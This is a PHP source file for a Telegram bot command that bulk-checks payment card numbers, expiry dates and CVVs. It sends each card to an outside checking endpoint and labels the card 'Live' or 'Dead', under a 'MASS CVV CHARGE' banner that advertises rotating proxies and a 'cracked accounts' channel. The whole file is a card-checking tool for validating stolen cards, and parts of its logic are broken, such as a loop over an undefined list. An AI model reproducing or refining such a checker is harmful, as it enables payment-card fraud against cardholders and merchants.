<?php

if (strpos($text, '!mass') === 0 or strpos($text, '/mass') === 0 or strpos($text, '.mass') === 0) {
    $messageidtoedit87 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>Wait for Result...</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
    ]);

    $messageidtomass = capture(json_encode($messageidtoedit87), '"message_id":', ',');

$lista = substr($message, 6);
$lista = clean($lista);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
//$lista = ("$cc|$mes|$ano|$cvv");
  
  $fullmes = '';

foreach ($cc_list as $cc) {
    $status = chemker1($cc, $mes, $ano, $cvv);

    $fullmes .= "
    CC: <code>$lista</code>
    Result: <code>$status</code>";
}


$umass = "<b>𒀭  MASS CVV CHARGE 1 $  𒀭
   ━━━━━━━━━━━━━</b>";

$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/crackedaccns'>[ TEAM Celestial ]</a>
╰───────────────✘</b>";

$mallmsg =("$umass $fullmes $fmass");


    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtomass,
        'text' => $mallmsg,
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);
}

function chemker1($cc, $mes, $ano, $cvv) {

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://iniciativaesahora.org/bot/apis/1.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: iniciativaesahora.org',
'method: GET',
'path: /bot/apis/1.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: ',
'cookie: ',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
   ));

$result2a = curl_exec($ch);

curl_close($ch);



    if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))) {
        $status = "Live 🟡";
        $response = "Zip Mismatch ❎";
    } elseif (strpos($result2a, "CVV LIVE")) {
        $status = "Live 🟢";
        $response = "CVV Matched ✅";
    } else {
        $status = "Dead 🔴";
        $response = "DEAD = TRY ANOTHER";
    }

    return $status;
}

